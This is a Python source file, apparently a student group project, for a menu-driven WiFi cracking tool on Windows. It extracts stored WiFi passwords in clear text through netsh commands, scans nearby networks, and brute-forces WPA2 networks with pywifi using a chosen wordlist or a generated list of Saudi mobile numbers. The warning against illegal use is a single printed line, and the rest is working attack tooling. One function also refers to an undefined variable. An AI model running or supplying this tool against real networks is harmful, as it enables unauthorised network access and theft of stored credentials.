import colorama
import subprocess
from time import sleep
import pywifi
import pyfiglet
import time
from pywifi import const
import os
from colorama import Fore
import random

def menu():
    subprocess.run('cls', shell=True)
    ascii_art = pyfiglet.figlet_format("!  Wi Fi   Cracking  !")
    print(ascii_art)

    colorama.init(autoreset=True)

    print(Fore.LIGHTRED_EX + "[1] Crack Current WiFi \n")
    print(Fore.LIGHTRED_EX + "[2] Crack Previously Connected WiFis \n")
    print(Fore.LIGHTRED_EX + "[3] Crack Any WiFi Network With Your Preferred WordList \n")
    print(Fore.LIGHTRED_EX + "[4] Crack Any WiFi Network with a Phone Numbers WordList \n")
    print(Fore.LIGHTRED_EX + "[5] Exist \n")


    while True:
        choice = input("Please Choose a Number: ")
        if choice == '1':
            subprocess.run('cls', shell=True)
            print(Fore.LIGHTRED_EX + pyfiglet.figlet_format("!  Current   Wi Fi  !"))
            current_WiFi()
            break
        elif choice == '2':
            subprocess.run('cls', shell=True)
            print(Fore.LIGHTRED_EX + pyfiglet.figlet_format("!  Previous   Wi Fi  !"))
            previously_WiFi()
            break
        elif choice == '3':
            subprocess.run('cls', shell=True)
            print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("!  Any   Wi Fi  !"))
            op3()
            break

        elif choice == '4':
            subprocess.run('cls', shell=True)
            print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("!   Crack   With   Phone   Numbers !"))
            crack_with_phone_numbers()

        elif choice == '5':
            subprocess.run('cls', shell=True)
            print(Fore.YELLOW + pyfiglet.figlet_format("!  WARNING  !"))
            print(Fore.YELLOW + "We advise against using this tool for illegal activities.")
            sleep(3)

            subprocess.run('cls', shell=True)
            print(pyfiglet.figlet_format("Cracking Wifi Tool  By  Group   6"))
            sleep(0.7)
            print("Developed By:")
            sleep(0.7)
            print(Fore.LIGHTRED_EX + "[1] Maryam Tariq AlBugaey")
            sleep(0.7)
            print(Fore.LIGHTRED_EX + "[2] Fatima Husain Abujaid")
            sleep(0.7)
            print(Fore.LIGHTRED_EX + "[3] Sara Nasser AlSubaie")
            sleep(0.7)
            print(Fore.LIGHTRED_EX + "[4] Juri Mohammed Alaqeel")
            sleep(0.7)
            print(Fore.LIGHTRED_EX + "[5] Lwlah Aldowihi\n")
            sleep(0.7)


            print(Fore.LIGHTRED_EX +" --- Instructor: Mr.Hussain Alattas ---")


            exit()
        else:
            print("Invalid Input!! Please enter number from 1 to 5")

def current_WiFi():
    # Use Python to execute windows command
    command = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True).stdout.decode()
    ls = command.split("\n")
    for line in ls:
        if line.lstrip().startswith("SSID"):
            curr = line.lstrip()[25:]

    curr = str(curr)
    curr = "\"" + curr
    list2 = list(curr)
    list2[len(list2) - 1] = "\""
    str1 = ''.join(list2)

    vmrun_cmd = "netsh wlan show profile name= " + str1 + " key=clear"
    command2 = subprocess.run(vmrun_cmd, capture_output=True).stdout.decode()

    command2 = command2.split("\n")

    for line in command2:
        if line.lstrip().startswith("Name"):
            ssidName = line.lstrip()[25:]
        if line.lstrip().startswith("Key Content"):
            key = line.lstrip()[25:]

    print("SSID: %s" % ssidName)
    print(Fore.LIGHTRED_EX + "Password: %s" % key)

def previously_WiFi():
    WiFiFile = []
    WiFiName = []
    WiFiPassword = []

    # Use cmd to execute command
    command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    # Get the current directory
    path = os.getcwd()

    # Wi-Fi Cracking
    for file in os.listdir(path):
        if (file.startswith("Wi-Fi") or file.startswith("WiFi")) and file.endswith(".xml"):
            WiFiFile.append(file)
            for i in WiFiFile:
                with open(i, "r") as f:
                    for line in f.readlines():
                        if 'name' in line:
                            stripped = line.strip()
                            front = stripped[6:]
                            back = front[:-7]
                            WiFiName.append(back)
                        if "keyMaterial" in line:
                            stripped = line.strip()
                            front = stripped[13:]
                            back = front[:-14]
                            WiFiPassword.append(back)
                            for x, y in zip(WiFiName, WiFiPassword):
                                print("SSID: " + x, Fore.LIGHTRED_EX + "Password: " + y, sep='\n')


# WiFi scanner
def wifi_scan():
    # interface information
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]   # use the first interface
    # start scan
    interface.scan()
    for i in range(2):
        time.sleep(1)
        print('\rThe WiFi is being Scanning, Wait for [ ' + str(1 - i), end=' ]')
    print('\rScan Completed !！\n' + '=' * 40)
    print('\r{:6}{:10}{}'.format('No.', 'Strength', 'WiFi Name'))

    bss = interface.scan_results()

    wifi_name_set = set()
    for w in bss:
        # dealing with decoding
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # store into a list sorted by signal strength
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # format output
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<10d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('=' * 40)
    return wifi_name_list


def wifi_password_crack(wifi_name):
    # password dictionary file
    wifi_dic_path = input("Select a wordlist of password dictionary used to brute force attack: ")
    with open(wifi_dic_path, 'r') as f:
        # loop through all combinations
        for pwd in f:
            # strip of the trailing new line character
            pwd = pwd.strip('\n')

            wifi = pywifi.PyWiFi()
            # initialise interface using the first one
            interface = wifi.interfaces()[0]
            # disconnect all other connections
            interface.disconnect()
            # waiting for all disconnection to complete
            while interface.status() == 4:
                # break from the loop once all disconnection complete
                pass
            # initialise profile
            profile = pywifi.Profile()
            # wifi name
            profile.ssid = wifi_name
            # need verification
            profile.auth = const.AUTH_ALG_OPEN

            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi password
            profile.key = pwd

            interface.remove_all_network_profiles()

            tmp_profile = interface.add_network_profile(profile)
            # attempting new connection
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # when interface connection status is 4, it succeeds
                # greater than 1.5s normally means the connection failed
                # normal successful connection is completed in 1.5s
                # increase the timer to increase the accuracy at the cost of slower speed
                if interface.status() == 4:
                    print(Fore.LIGHTGREEN_EX + f'\rConnection Succeeded！Password：{pwd}')
                    user_choice = input(
                        "Would you like to print the information of network ? \nType Y (yes) or N (no): ")

                    if user_choice == 'Y' or user_choice == 'y':
                        print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("!  W i F i   Info  !"))
                        print(subprocess.run(["netsh", "wlan", "show", "profile", wifi_name, "key=clear"],
                                             capture_output=True).stdout.decode())
                    elif user_choice == 'N' or user_choice == 'n':
                        print("Goodbye")
                    else:
                        print("Invalid choice.")
                    exit(0)
                else:
                    print(Fore.LIGHTRED_EX + f'\rTrying with {pwd}', end='')

def wifi_password_crack_with_numbers(name):

    # password dictionary file
    with open("pass.txt", 'r') as f:
        # loop through all combinations
        for pwd in f:
            # strip of the trailing new line character
            pwd = pwd.strip('\n')

            wifi = pywifi.PyWiFi()
            # initialise interface using the first one
            interface = wifi.interfaces()[0]
            # disconnect all other connections
            interface.disconnect()
            # waiting for all disconnection to complete
            while interface.status() == 4:
                # break from the loop once all disconnection complete
                pass
            # initialise profile
            profile = pywifi.Profile()
            # wifi name
            profile.ssid = name
            # need verification
            profile.auth = const.AUTH_ALG_OPEN

            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi password
            profile.key = pwd

            interface.remove_all_network_profiles()

            tmp_profile = interface.add_network_profile(profile)
            # attempting new connection
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # when interface connection status is 4, it succeeds
                # greater than 1.5s normally means the connection failed
                # normal successful connection is completed in 1.5s
                # increase the timer to increase the accuracy at the cost of slower speed
                if interface.status() == 4:
                    print(Fore.LIGHTGREEN_EX + f'\rConnection Succeeded！Password：{pwd}')
                    user_choice = input(
                        "Would you like to print the information of network ? \nType Y (yes) or N (no): ")

                    if user_choice == 'Y' or user_choice == 'y':
                        print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("!  W i F i   Info  !"))
                        print(subprocess.run(["netsh", "wlan", "show", "profile", wifi_name, "key=clear"],
                                             capture_output=True).stdout.decode())
                    elif user_choice == 'N' or user_choice == 'n':
                        print("Goodbye")
                    else:
                        print("Invalid choice.")
                    exit(0)
                else:
                    print(Fore.LIGHTRED_EX + f'\rTrying with {pwd}', end='')



def op3():
    # exit signal
    exit_flag = 0
    # target number
    target_num = -1
    while not exit_flag:
        try:
            print(' WiFi Networks '.center(40, '='))

            wifi_list = wifi_scan()

            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Please Select The WiFi you Want to Crack: '))

                    if target_num in range(len(wifi_list)):
                        # double-confirm
                        while not choose_exit_flag:
                            try:
                                choose = str(
                                    input(f'The Selected WiFi : {wifi_list[target_num][1]}，Are You Sure? (Y/N)'))
                                # lower case the confirmation input
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                # exception handling
                                else:
                                    print('Invalid input!! Please Chose only (Y/N)')
                            # exception handling
                            except ValueError:
                                print('Invalid input!! Please Chose only (Y/N)')
                        # exit
                        if choose_exit_flag == 1:
                            break
                        else:
                            print("")
                except ValueError:
                    print('Invalid input!! Please Enter a number: ')

            wifi_password_crack(wifi_list[target_num][1])
            print('=' * 45)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e


def op4():
    # exit signal
    exit_flag = 0
    # target number
    target_num = -1
    while not exit_flag:
        try:
            print(' WiFi Networks '.center(40, '='))

            wifi_list = wifi_scan()

            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Please Select The WiFi you Want to Crack: '))

                    if target_num in range(len(wifi_list)):
                        # double-confirm
                        while not choose_exit_flag:
                            try:
                                choose = str(
                                    input(f'The Selected WiFi : {wifi_list[target_num][1]}，Are You Sure? (Y/N)'))
                                # lower case the confirmation input
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                # exception handling
                                else:
                                    print('Invalid input!! Please Chose only (Y/N)')
                            # exception handling
                            except ValueError:
                                print('Invalid input!! Please Chose only (Y/N)')
                        # exit
                        if choose_exit_flag == 1:
                            break
                        else:
                            print("")
                except ValueError:
                    print('Invalid input!! Please Enter a number: ')

            wifi_password_crack_with_numbers(wifi_list[target_num][1])
            print('=' * 45)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e


def crack_with_phone_numbers ():
    with open("pass.txt", "w") as f:
        STC = '055'
        for y in range(100):
            for x in range(7):
                num = random.randint(1000000, 9999990)
                n1 = str(STC) + str(num)
                f.write(n1 + '\n')
                break

    with open("pass.txt", "a") as f:
        mobily = '054'
        for y in range(100):
            for x in range(7):
                num = random.randint(1000000, 9999990)
                n2 = str(mobily) + str(num)
                f.write(n2 + '\n')
                break

        mobily2 = '056'
        for y in range(100):
            for x in range(7):
                num = random.randint(1000000, 9999990)
                n3 = str(mobily2) + str(num)
                f.write(n3 + '\n')
                break

        zain = '053'
        for y in range(100):
            for x in range(7):
                num = random.randint(1000000, 9999990)
                n4 = str(zain) + str(num)
                f.write(n4 + '\n')
                break

        zain2 = '059'
        for y in range(100):
            for x in range(7):
                num = random.randint(1000000, 9999990)
                n5 = str(zain2) + str(num)
                f.write(n5 + '\n')
                break
    op4()





# main execution function
def main():
    menu()


if __name__ == '__main__':
    main()
